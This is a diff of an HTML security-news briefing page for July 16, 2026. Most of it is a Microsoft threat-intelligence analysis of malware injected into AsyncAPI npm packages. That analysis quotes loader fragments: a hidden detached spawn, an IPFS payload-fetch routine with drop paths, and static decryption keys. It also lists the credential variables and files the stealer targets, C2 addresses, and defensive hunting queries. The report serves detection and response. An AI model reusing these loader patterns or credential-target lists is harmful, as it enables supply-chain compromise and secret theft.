@@ -59,94 +59,417 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-07-15</h1>
+        <h1>Security Briefing // 2026-07-16</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Two SonicWall SMA 1000 Zero-Days Exploited, One Could Enable Admin Commands</button></li><li><button onclick="show('art-1')">SonicWall warns of SMA1000 flaws exploited in zero-day attacks, patch now</button></li><li><button onclick="show('art-2')">Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack</button></li><li><button onclick="show('art-3')">Microsoft Patches a Record 570 Security Flaws</button></li><li><button onclick="show('art-4')">Progress confirms ShareFile zero-day flaw behind Storage Zone shutdown</button></li><li><button onclick="show('art-5')">Pandora’s Container Part 1: Unpacking Azure Container Security</button></li><li><button onclick="show('art-6')">Microsoft Entra ID security updates: Passkeys are the default authentication method in Entra ID</button></li><li><button onclick="show('art-7')">Lessons Learned from CISA’s Recent GitHub Leak</button></li><li><button onclick="show('art-8')">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Zoom Patches Critical Windows Flaw That Could Enable Account Takeover</button></li><li><button onclick="show('art-1')">Unpacking the AsyncAPI npm supply chain compromise and import-time payload delivery</button></li><li><button onclick="show('art-2')">Zoom warns of critical account takeover vulnerability</button></li><li><button onclick="show('art-3')">There and Back Again: An Operators Guide on NTLM Relaying Egress</button></li><li><button onclick="show('art-4')">The Risk of Exposed Cloud Functions and How to Harden</button></li><li><button onclick="show('art-5')">CISA warns admins to patch actively exploited SharePoint flaws</button></li><li><button onclick="show('art-6')">Compromised AsyncAPI npm Packages Deliver Multi-Stage Botnet Malware</button></li><li><button onclick="show('art-7')">Microsoft Patches a Record 570 Security Flaws</button></li><li><button onclick="show('art-8')">Pandora’s Container Part 1: Unpacking Azure Container Security</button></li><li><button onclick="show('art-9')">Lessons Learned from CISA’s Recent GitHub Leak</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Two SonicWall SMA 1000 Zero-Days Exploited, One Could Enable Admin Commands</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/two-sonicwall-sma-1000-zero-days.html" target="_blank">Original Link</a></p>
-            <div class="content-text">SonicWall has [warned](https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0008) of active exploitation of two zero-day vulnerabilities impacting Secure Mobile Access (SMA) 1000 series appliances, one of which could be exploited to achieve arbitrary command execution.
-The vulnerabilities are listed below -
-- CVE-2026-15409 (CVSS score: 10.0) - A Server-side request forgery (SSRF) vulnerability that a remote unauthenticated attacker could exploit to potentially cause the appliance to make requests to an unintended location.
-- CVE-2026-15410 (CVSS score: 7.2) - A post-authentication code injection vulnerability rooted in the Appliance Management Console (AMC) that a remote authenticated attacker could exploit to execute arbitrary operating system commands as administrator under certain conditions.
-SonicWall said it has "investigated multiple cases indicating the active exploitation of the vulnerabilities," urging customers to apply the fixes as soon as possible. The patches are available in the following versions -
-- 12.4.3-03453 (platform-hotfix) and higher versions
-- 12.5.0-02835 (platform-hotfix) and higher versions
-Users are also urged to perform a thorough forensic analysis of the system to determine the presence of any indicators of compromise (IoCs) associated with exploitation -
-- If in extraweb_access.log are mentioned requests to /__api__/login or /__api__/logout with http 200 status
-- If in extraweb_access.log are mentioned requests to /wsproxy with suspicious host parameters with 101 http status
-- If in ctrl-service.log are mentioned hotfix rollbacks with path traversal names
-- If /var/lib/unit/conf.json contains routes for /__api__/login or /__api__/logout (these URIs do not exist in legitimate configuration)
-Should one of these indicators be present, it's advised to re-image physical appliances or redeploy virtual appliances, change user and administrator passwords, and reset time-based one-time password tokens.
-Adam Babis of SonicWall's product security incident response team (PSIRT) has been credited with discovering and reporting the flaws. SonicWall also acknowledged the contributions of Volexity's Sean Koessel and Steven Adair to help advance the internal investigation and identify an additional IoC.
-The development has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to [add](https://www.cisa.gov/news-events/alerts/2026/07/14/cisa-adds-four-known-exploited-vulnerabilities-catalog) the two flaws to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by July 17, 2026.
+            <h2 class="article-title">Zoom Patches Critical Windows Flaw That Could Enable Account Takeover</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/zoom-patches-critical-windows-flaw-that.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Zoom has released security updates for a critical security flaw impacting Zoom Workplace for Windows that could facilitate account takeover.
+The vulnerability, tracked as CVE-2026-53412 (CVSS score: 9.8), affects Zoom Desktop Client for Windows, Zoom VDI Client for Windows, and Zoom Meeting SDK for Windows.
+"Improper Input Validation in Zoom Desktop Client for Windows, Zoom VDI Client for Windows, and Zoom Meeting SDK for Windows may allow an unauthenticated user to conduct an account takeover via network access," Zoom [said](https://www.zoom.com/en/trust/security-bulletin/zsb-26014/) in an advisory released this week.
+The latest security fixes also address three high-severity flaws -
+[CVE-2026-53411](https://www.zoom.com/en/trust/security-bulletin/zsb-26013/)(CVSS score: 7.8) - An improper input validation vulnerability in the Zoom Workplace VDI Plugin for Windows before version 6.6.14 that may allow an authenticated user to conduct an escalation of privilege via local access.[CVE-2026-53410](https://www.zoom.com/en/trust/security-bulletin/zsb-26012/)(CVSS score: 7.0) - A time-of-check to time-of-use (TOCTOU) race condition vulnerability in the installation and uninstallation process of certain Zoom Clients for Windows that could allow an authenticated local user to escalate privileges.[CVE-2026-53409](https://www.zoom.com/en/trust/security-bulletin/zsb-26011/)(CVSS score: 7.8) - An improper privilege management vulnerability in Zoom Rooms for Windows before version 7.1.0 that may allow an authenticated user to conduct an escalation of privilege via local access.
+It's worth noting that CVE-2026-53410 affects the following products -
+- Zoom Workplace for Windows before version 7.0.5
+- Zoom Workplace VDI Client for Windows before 6.5.17 and 6.6.14 in their respective branch
+- Zoom Workplace VDI plugin for Windows before 6.5.17 and 6.6.14 in their respective branch
+- Zoom Rooms for Windows before 7.0.5
+- Remote Control for Zoom Contact Center for Windows before version 7.0.0
+As of writing, there are no indications that any of the flaws are being exploited in real-world attacks. Users can stay protected by applying the latest updates.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-1" class="article-body">
-            <h2 class="article-title">SonicWall warns of SMA1000 flaws exploited in zero-day attacks, patch now</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-sma1000-flaws-exploited-in-zero-day-attacks-patch-now/" target="_blank">Original Link</a></p>
-            <div class="content-text">SonicWall warns that threat actors have been exploiting two SMA1000 vulnerabilities, tracked as CVE-2026-15409 and CVE-2026-15410, in zero-day attacks and urges customers to install the newly released security updates. [...]
+            <h2 class="article-title">Unpacking the AsyncAPI npm supply chain compromise and import-time payload delivery</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/07/15/unpacking-asyncapi-npm-supply-chain-compromise-import-time-payload-delivery/" target="_blank">Original Link</a></p>
+            <div class="content-text">On July 14, 2026, Microsoft Threat Intelligence identified a coordinated supply chain compromise of the @asyncapi npm organization, a widely used set of packages for the AsyncAPI specification and code generation. Five package versions across four package names were republished within roughly ninety minutes, each carrying the same maliciously injected loader: @asyncapi/specs (in both the 6.11.2-alpha.1 prerelease and 6.11.2 stable release), @asyncapi/generator@3.3.1, @asyncapi/generator-components@0.7.1, and @asyncapi/generator-helpers@1.1.1.
+Because @asyncapi/specs is a transitive dependency of numerous AsyncAPI tooling packages, this attack affected developer workstations, CI/CD pipelines, container builds, or production services that resolved and imported the affected versions during the exposure window. Unlike the more common postinstall-hook supply-chain pattern, this campaign executes at module-load (import/require) time. When any consuming build or application imports a poisoned package, the injected block runs immediately. Because the trigger is an import rather than an install script, the common npm install –ignore-scripts mitigation does not neutralize it. The second stage decrypts and evaluates a Miasma modular runtime with active command and control (C2), persistence, and decentralized fallback channels. Although disabled in this instance, credential-harvesting, propagation, and additional high-risk modules could be enabled through persistence.
+Microsoft Defender Antivirus detects and blocks malicious artifacts as Trojan:JS/MiasmStealer.SC and Trojan:Script/Supychain.A. Microsoft Defender for Endpoint provides behavioral coverage for the suspicious detached Node.js process spawn, IPFS retrieval, and persistence activity. Organizations should immediately remove all five affected versions, purge npm and Yarn caches, hunt for sync.js under the NodeJS masquerade directories, block outbound connections to 85.137.53[.]71 on ports 8080, 8081, and 8091, and rotate all credentials accessible from any environment that imported the compromised packages. Detailed hunting queries, indicators of compromise, and mitigation guidance are provided in the succeeding sections.
+Attack chain overview
+The compromise originated from a pwn request against asyncapi/generator. A misconfigured GitHub Actions workflow (pull_request_target) executed attacker-controlled pull-request (PR) code, exposed the asyncapi-bot personal access token (PAT), and enabled unauthorized pushes to auto-publish branches. The legitimate GitHub Actions OpenID Connect (OIDC) release workflows then published the poisoned packages under the automated identity npm-oidc-no-reply@github[.]com, producing artifacts with valid provenance signatures built from unauthorized source commits.
+The campaign progressed through six phases, shown in Figure 1:
+- Pipeline compromise. The attacker exploited a vulnerable GitHub Actions workflow to steal a privileged bot token.
+- Code injection. Heavily obfuscated loaders were inserted into one source file per package.
+- Staged release. An alpha prerelease was followed by a stable release 24 minutes later, with a byte-identical payload, expanding blast radius.
+- Delivery. Consumers pulled poisoned versions through normal npm and Yarn dependency resolution; –ignore-scripts was not effective.
+- Import-time execution. require() or import triggered the malicious main(), which spawned a hidden detached child process.
+- IPFS second-stage fetch. The child downloaded sync.js from IPFS and wrote it to an OS-specific “NodeJS” masquerade directory.
+The Miasma runtime provided encrypted bootstrap, persistence, C2 communication, data return paths, and resilient discovery via Nostr, Ethereum, BitTorrent DHT, libp2p, and IPFS. Six additional capability modules (credential harvest, encrypted exfiltration, supply-chain propagation, metamorphic generation, AI-tool poisoning, and sandbox evasion) were implemented but disabled in this build.
+| Time (UTC) | Observed event |
+| ~07:10 | @asyncapi/generator@3.3.1, @asyncapi/generator-components@0.7.1, and @asyncapi/generator-helpers@1.1.1 republished with the injected loader. |
+| 08:06:20 | @asyncapi/specs@6.11.2-alpha.1 published with the malicious importer prepended to index.js. |
+| 08:30:09 | @asyncapi/specs@6.11.2 stable published with a byte-identical payload, widening downstream reach. |
+| 08:49:22 | First observed downstream fetch of the stable 6.11.2 tarball into a Yarn cache during dependency installation. |
+How the attack started: GitHub Actions pwn request
+The attack chain began with a malicious pull request targeting the asyncapi/generator repository’s docs-preview automation. Opened as PR #2155, it carried the attacker-controlled commit 47be388, timestamped 05:08:58 UTC on July 14. The associated Docs Preview (Netlify) workflow started at 05:11:05 UTC.. Although the PR and source fork were later removed, the workflow record remains available.
+The pull request PR #2155 targeted manual-netlify-preview.yml, which combined two unsafe choices: it used pull_request_target, placing the job in the base repository’s security context, and it checked out the pull request’s untrusted head commit. The run had a broadly privileged GITHUB_TOKEN, checkout credentials persisted in the local Git configuration until post-job cleanup (the default behavior of actions/checkout), and steps that referenced repository secrets.
+The submitted MDX contained code was designed to retrieve JavaScript from rentry[.]co/elzotebo999 and evaluate the response. The public log confirms that the malicious commit was processed by the privileged workflow, but it does not show whether the rentry[.]co web request succeeded or whether a credential was stolen. Later push records identify asyncapi-bot as the authenticated actor. Together, these records establish that the vulnerable workflow ran before the bot-authenticated pushes, but they do not establish how the credential was obtained.
+The underlying workflow weakness had been identified before the compromise. On April 29, a proof-of-concept examined whether untrusted pull-request content could be executed in the privileged docs-preview workflow. A May 17 proposal then sought to separate untrusted build activity from steps that received repository secrets and was still under review when the incident occurred.
+Trusted publishing became the delivery mechanism
+Once the attacker could push commits as asyncapi-bot, there was no need to compromise npm or construct a separate publishing channel. The attacker could ride the project’s normal release path and let its trusted pipeline do the distribution. Commit 3eab3ec carries a timestamp of 06:58:42 UTC, while a surviving push-triggered workflow started at 07:05:42 UTC. Its message, “fix: test release workflow on next”, matched the release workflow’s commit-message condition. The legitimate release-with-changesets.yml workflow then published three poisoned packages at approximately 07:10 UTC.
+A closely linked compromise subsequently affected asyncapi/spec-json-schemas. The malicious lineage first triggered workflows on alpha between 07:56 and 08:04 UTC. The same malicious commit was later pushed to master at approximately 08:14 UTC, followed by a child commit at 08:28 UTC. The legitimate if-nodejs-release.yml workflow published @asyncapi/specs@6.11.2-alpha.1 at 08:06 UTC and @asyncapi/specs@6.11.2 at 08:30 UTC.
+All five malicious versions were published through npm trusted publishing using GitHub OIDC and carried valid provenance attestations. The attestations accurately identified the legitimate repositories, commits, and workflows that created the packages, even though the triggering commits were unauthorized.
+The payload operates in multiple stages, each designed to increase evasion and ensure resilient execution. Stage 0 establishes stealth by declaring no npm lifecycle hooks. Stage 1 executes the loader at require-time and spawns a hidden child process. Stage 1b deobfuscates the IPFS fetch logic and downloads sync.js. Stage 2 decrypts the ~8.2 MB encrypted bundle through three cryptographic layers. Stage 3 initializes the full Miasma modular runtime with C2, persistence, and decentralized fallback channels.
+Stage 0: No lifecycle hooks declared
+The absence of lifecycle hooks is a deliberate evasion choice. Security tooling that focuses on preinstall/postinstall auditing will not flag these packages. All affected packages declared no preinstall, install, or postinstall hooks in package.json. This bypassed hook-focused scanners and left import-time execution as the real trigger path.
+Stage 1: Import-time loader
+The loader executes the moment any application imports the compromised module; no user action beyond dependency resolution is required. The attacker placed the same bootstrap pattern in each package’s exported entry path, so normal application startup would trigger execution automatically.
+- @asyncapi/specs → index.js
+- @asyncapi/generator → lib/templates/config/validator.js
+- @asyncapi/generator-helpers → src/utils.js
+- @asyncapi/generator-components → lib/utils/ErrorHandling.js
+spawn('node', [payloadPath], { detached: true, stdio: 'ignore', windowsHide: true, }).unref(); |
+Stage 1b: IPFS fetch
+The inner payload reveals hard-coded IPFS content identifiers and OS-aware drop logic. This intermediate stage reconstructs the transport routine at runtime, so the larger second stage never appears in cleartext in the published package.
+| Package set | IPFS CID |
+| specs | Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf |
+| generator-family | QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9 |
+1 2 3 4 5 6 7 8 9 | const FILE_URL = 'hxxps://ipfs[.]io/ipfs/<cid>'; const FILE_NAME = 'sync.js'; function getTargetDirectory() { if (process.platform === 'win32') return '%LOCALAPPDATA%\NodeJS'; if (process.platform === 'darwin') return '~/Library/Application Support/NodeJS'; if (process.platform === 'linux') return '~/.local/share/NodeJS'; return '~/.config/NodeJS'; } </cid> |
+Stage 2: Encrypted payload (sync.js)
+Despite appearing cryptographically sophisticated, the entire decryption chain uses static embedded key material, meaning the runtime can be recovered offline without execution. The layered design primarily increases analyst effort; every secret required to unwrap the bundle ships inside the loader.
+- sync.js is ~8.2 MB; all key material is static and embedded.
+- HKDF-SHA256 uses master string rt-vault-master-key-32b-aaaaaaaa and info string rt-file-key.
+- AES-256-GCM uses IV = first 12 bytes and auth tag = last 16 bytes of the blob.
+- The decrypted string is ROT-94de-rotated and then executed with eval().
+Stage 3: Miasma runtime
+The runtime is a command framework identified as M-RED-TEAM v6.4 with campaign configuration miasma-train-p1. In this build’s configuration, persistence and C2 are active, but data collection and propagation modules remain dormant. The runtime supports traditional remote access trojan (RAT) commands, including directory listing, file retrieval, file upload, remote shell execution, proxying, and data exfiltration. Persistence is installed through platform-specific mechanisms: a Windows HKCU Run key (miasma-monitor), a Linux systemd user unit (miasma-monitor.service), and macOS shell RC injection (.zshrc, .bashrc, or .bash_profile).
+- Recovered identifiers: M-RED-TEAM v6.4, miasma-train-p1, and miasma-test-org.
+- Persistence: Win HKCU Run value miasma-monitor, Linux miasma-monitor.service, and macOS user-space shell/launch persistence.
+- Primary endpoints: 85.137.53[.]71:8080 (C2), 85.137.53[.]71:8081 (upload), 85.137.53[.]71:8091 (management).
+- Fallback channels include Nostr, Ethereum, BitTorrent DHT, libp2p, and IPFS.
+- Disabled in the analyzed build: recon, propagation, AI-poisoning, metamorphic generation, and evasion.
+Credential harvesting (disabled in this build)
+The framework contains broad credential-access code targeting secrets across major platforms that a developer or continuous integration and continuous delivery (CI/CD) system might access, including browser-saved passwords from multiple browsers.
+The framework targets over 100 environment variable names across source control (GITHUB_TOKEN, GITLAB_TOKEN), npm (NPM_TOKEN, NODE_AUTH_TOKEN), AWS (AWS_ACCESS_KEY, AWS_SECRET_ACCESS_KEY), Azure (AZURE_CLIENT_SECRET), GCP (GCLOUD_SERVICE_KEY), container/Kubernetes (DOCKER_TOKEN, K8S_AUTH_TOKEN), secrets managers (DOPPLER_TOKEN, VAULT_TOKEN), and AI platforms (ANTHROPIC_API_KEY, OPENAI_API_KEY).
+Credential files targeted from disk include .npmrc (npm tokens), .aws/credentials (AWS keys), kubeconfig (Kubernetes API), id_rsa/id_ed25519 (SSH keys), .vault-token (HashiCorp Vault), .netrc (Git/HTTPS auth), .docker/config.json (Docker registry), and google_credentials.json (GCP service accounts). When a GITHUB_TOKEN is available, the framework can enumerate accessible repositories and CI/CD context through GitHub APIs.
+Mitigation and protection guidance
+Review dependency trees, lockfiles, artifact repositories, and CI caches for the five compromised versions, including transitive references.
+Pin known-good versions: @asyncapi/specs 6.11.1 or earlier, @asyncapi/generator 3.3.0, @asyncapi/generator-components 0.7.0, and @asyncapi/generator-helpers 1.1.0.
+Do not rely on npm install –ignore-scripts as a mitigation; this campaign executes when the module is imported, not through a lifecycle hook.
+Purge npm and yarn caches on affected developer endpoints and build hosts, especially if the compromised tarballs were written into shared CI caches.
+Hunt for sync.js and the NodeJS masquerade directory on endpoints, and investigate any detached Node.js execution that references the IPFS CID or the sync.js file name.
+Block or alert on retrieval of the specific IPFS CID and monitor for network connections to 85.137.53[.]71 on ports 8080, 8081, and 8091.
+Rotate credentials and secrets from a clean host if a build system or workstation imported a compromised version, because second-stage execution can expose tokens and build integrity.
+Ensure that Microsoft Defender Antivirus cloud-delivered protection, Microsoft Defender for Endpoint telemetry, and Microsoft Defender XDR investigation workflows are enabled across developer and CI assets.
+Update to NPM CLI to [npm CLI v11.10.0+](https://github.blog/changelog/2026-02-18-npm-bulk-trusted-publishing-config-and-script-security-now-generally-available/) or Use the NPM CLI [min-release-age](https://docs.npmjs.com/cli/v11/using-npm/config#min-release-age) feature.
+Organizations that do not rely on IPFS for business operations can reduce their attack surface by blocking public IPFS gateways (ipfs.io, dweb.link, cloudflare-ipfs.com, and others) at the network perimeter. This proactive measure removes an increasingly common payload delivery channel used in supply chain campaigns without affecting standard development workflows.
+Organizations that produce software artifacts should also review their own release hardening. Because this incident appears consistent with CI/CD pipeline abuse through GitHub Actions OIDC publishing, defenders should review token scopes, workflow approvals, protected environments, release provenance, and anomaly detection around automated package publication. Supply chain response cannot stop at host triage; it must also include verification that the release process itself has not been subverted.
+After remediation, validate recovery deliberately. Rebuild affected projects from a known-good dependency baseline, confirm that compromised hashes are absent from package caches and artifact stores, and review endpoint telemetry for any lingering sync.js, NodeJS directory artifacts, or suspicious node child processes. For development organizations that share base images or golden build runners, rebuild those images as well so future jobs do not silently inherit poisoned caches or post-compromise persistence.
+Indicators of compromise
+| Package | Version | Injected file | Tarball SHA-256 |
+| @asyncapi/specs | 6.11.2-alpha.1 | index.js | d425e4583cc6185d41e95c45eda00550045a5d1919b9a012236a4520d009dbd7 |
+| @asyncapi/specs | 6.11.2 | index.js | 9b2e65db653ca8575c9b10eefb9a80c6006404812c2ec212bf5675e3c690233b |
+| @asyncapi/generator | 3.3.1 | lib/templates/config/validator.js | bfaeb987faa6de2b5a5eb63b1233d055215b09b0349a9394f2175fd7cdf385e4 |
+| @asyncapi/generator-components | 0.7.1 | lib/utils/ErrorHandling.js | 082d733db0687dcd768104972b065d4b58cb1e6043688c6c20fa3702337f36ab |
+| @asyncapi/generator-helpers | 1.1.1 | src/utils.js | 34014776d3d3ff11bc4439b02fd7ac0f02a887eb3a052eeafff236e2f6db8ad1 |
+| Type | Indicator |
+| Publisher identity | npm-oidc-no-reply@github[.]com |
+| IPFS URL | hxxps://ipfs[.]io/ipfs/Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf |
+| IPFS CID | Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf |
+| @asyncapi/generator lib/templates/config/validator.js | b9993a8ad0518849416798cf29668256ccb96598fc4423501ccab5312812653a |
+| @asyncapi/generator-components lib/utils/ErrorHandling.js | b270bdf8e2274ea1af0a6eed74d8f10e5fe61012d6cc226a43cc7cc7fd9f6292 |
+| @asyncapi/specs index.js (alpha AND stable — identical) | 8351d251cf0b5a0bd82242deaa0a14e3e1394418d55c0f4259dac4303b79fc0c |
+| @asyncapi/generator-helpers src/utils.js | 6e78713b75bd34828d49896176627f7face7aa9036cd874f2e02d9f23a9a9c71 |
+| Wrapper – sync.js (generator-family IPFS object) | 24b9ee242f21a73b55f7bb3297eafb33c60840907386b542ed79fc6b72365168 |
+| Central C2 | 85.137.53[.]71:8080 |
+| Upload service | 85.137.53[.]71:8081 |
+| Management configuration | 85.137.53[.]71:8091 |
+| Windows drop path | %LOCALAPPDATA%\NodeJS\sync.js |
+| Linux drop path | ~/.local/share/NodeJS/sync.js |
+| macOS drop path | ~/Library/Application Support/NodeJS/sync.js |
+| Fallback drop path | ~/.config/NodeJS/sync.js |
+| Runtime lock file | ~/.config/.miasma/run/node.lock |
+| mDNS service | _miasma._tcp |
+| HTTP path examples | /api/v1/beacon, /api/v1/file-result, /api/v1/file-content/<cid> |
+Microsoft Defender XDR detections
+Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
+| Tactic | Observed activity | Microsoft Defender coverage |
+| Initial access / Execution | Compromised packages published though GitHub Actions OIDC trusted publishing | Microsoft Defender Antivirus – Trojan:Script/Supychain.A – Trojan:JS/MiasmStealer.SC – Trojan:JS/SpawnLoader.MKV!MTB Microsoft Defender for Endpoint – Suspicious Node.js process behavior – Suspicious Node.js script execution |
+| Execution / Defense evasion | Module import triggers obfuscated main(), which spawns a hidden detached node | Microsoft Defender Antivirus – Trojan:JS/VaultLoader.MJZ!MTB Microsoft Defender for Endpoint – Suspicious Node.js process behavior – Suspicious Node.js script execution |
+| Persistence | OS-specific persistence installed | Microsoft Defender for Endpoint – Anomaly detected in ASEP registry – Suspicious modification of shell profile – Suspicious Linux service created |
+Advanced hunting queries
+Microsoft Defender XDR customers can run the following [advanced hunting](https://learn.microsoft.com/defender-xdr/advanced-hunting-overview) queries to find related activity in their networks:
+Persistence drop and detached spawn
+// Query 1: sync.js dropped under a NodeJS directory or related detached execution union isfuzzy=true ( DeviceProcessEvents | where Timestamp > ago(30d) | where (ProcessCommandLine has "sync.js" and ProcessCommandLine contains_cs "NodeJS") or ProcessCommandLine has "Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf" | project Timestamp, DeviceName, Evidence = ProcessCommandLine, Initiator = InitiatingProcessCommandLine, EventType = "Process" ), ( DeviceFileEvents | where Timestamp > ago(30d) | where FileName == "sync.js" and FolderPath contains_cs "NodeJS" | project Timestamp, DeviceName, Evidence = strcat(FolderPath, "\\", FileName), Initiator = InitiatingProcessFileName, EventType = "File" ) |
+IPFS CID retrieval
+1 2 3 4 5 6 | // Query 2: outbound retrieval of the IPFS second stage DeviceNetworkEvents | where Timestamp > ago(30d) | where RemoteUrl has "ipfs.io" | where RemoteUrl has "Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf" | project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessFileName |
+Poisoned package artifacts in caches
+1 2 3 4 5 6 7 8 9 10 | // Query 3: presence of a poisoned tarball in caches DeviceFileEvents | where Timestamp > ago(30d) | where SHA256 in ( "d425e4583cc6185d41e95c45eda00550045a5d1919b9a012236a4520d009dbd7", "9b2e65db653ca8575c9b10eefb9a80c6006404812c2ec212bf5675e3c690233b", "bfaeb987faa6de2b5a5eb63b1233d055215b09b0349a9394f2175fd7cdf385e4", "082d733db0687dcd768104972b065d4b58cb1e6043688c6c20fa3702337f36ab", "34014776d3d3ff11bc4439b02fd7ac0f02a887eb3a052eeafff236e2f6db8ad1") | project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName |
+Suspicious Node.js execution
+1 2 3 4 5 | DeviceProcessEvents | where Timestamp > ago(3d) | where FileName in~ ("node", "node.exe") | where ProcessCommandLine has "node.exe -e \"const _0x5af5e1" or ProcessCommandLine has "node -e \"const _0x5af5e1" | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath |
+Microsoft Security Copilot
+Security Copilot customers can use the standalone experience to create their own prompts or run prebuilt promptbooks to automate investigation and response tasks related to this threat. Useful promptbooks for this activity include Incident investigation, Microsoft User analysis, Threat actor profile, Threat Intelligence 360 report based on MDTI intelligence, and Vulnerability impact assessment. Some promptbooks require access to Microsoft Defender XDR, Microsoft Sentinel, or related Microsoft security plugins.
+For this campaign, Security Copilot can help analysts summarize affected devices, pivot from the package hashes to endpoint evidence, identify hosts that communicated with the IPFS path or C2 infrastructure, and build remediation actions such as cache purge, credential rotation, and containment sequencing for impacted developer systems and build runners.
+Threat intelligence reports
+Microsoft customers can use Microsoft Defender XDR Threat analytics and related Microsoft threat intelligence reporting to stay current on the malicious activity, indicators, detection coverage, and recommended response actions associated with this compromise. These reports provide investigation context, protection guidance, and updated intelligence that security teams can use to prevent, mitigate, or respond to related activity in customer environments.
+As with other active supply-chain investigations, defenders should monitor for updated intelligence on package status, additional affected versions, infrastructure changes, and newly surfaced post-compromise tradecraft. Microsoft will continue to incorporate validated indicators and detections into Microsoft security products as the investigation evolves.
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+[Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/).</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">Zoom warns of critical account takeover vulnerability</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/zoom-warns-of-critical-account-takeover-vulnerability/" target="_blank">Original Link</a></p>
+            <div class="content-text">Zoom is warning of a critical vulnerability in its desktop client and software development kit for Windows that could be exploited by an unauthenticated party to hijack accounts. [...]
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/microsoft-patches-record-622-flaws.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft shipped its largest Patch Tuesday on record today, and two of the fixes close holes that attackers are already exploiting. The release covers 622 of Microsoft's own CVEs by its [Security Update Guide](https://msrc.microsoft.com/update-guide/releaseNote/2026-Jul) count, more than triple [June's previous high of around 200](https://thehackernews.com/2026/06/microsoft-patches-record-206-flaws.html).
-Those two live bugs are the ones to grab first. Microsoft credits incident responders for both. Both are elevation-of-privilege flaws in identity and collaboration infrastructure: CVE-2026-56164 in on-premises SharePoint Server and CVE-2026-56155 in Active Directory Federation Services.
-Neither is one of the splashy remote code execution criticals. They are privilege bugs in two systems that matter more than their scores suggest: the company document store, and the box that signs its logins.
-The two zero-days to patch first
-[CVE-2026-56164](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-56164), a SharePoint Server flaw Microsoft says is being exploited in attacks, lets an unauthenticated attacker escalate privileges over the network. No credentials, no user interaction, remote. Microsoft credited it to Mandiant's incident responders and Google's FLARE team, which points to discovery inside active attacks, though Microsoft has not said how it was exploited or by whom.
-If you run self-hosted SharePoint, this is the one to grab first, and there is a second clock on it: today is also the day SharePoint Server 2016 and 2019 reach the end of extended support. Unlike Windows Server or SQL Server, neither has a paid ESU program to fall back on.
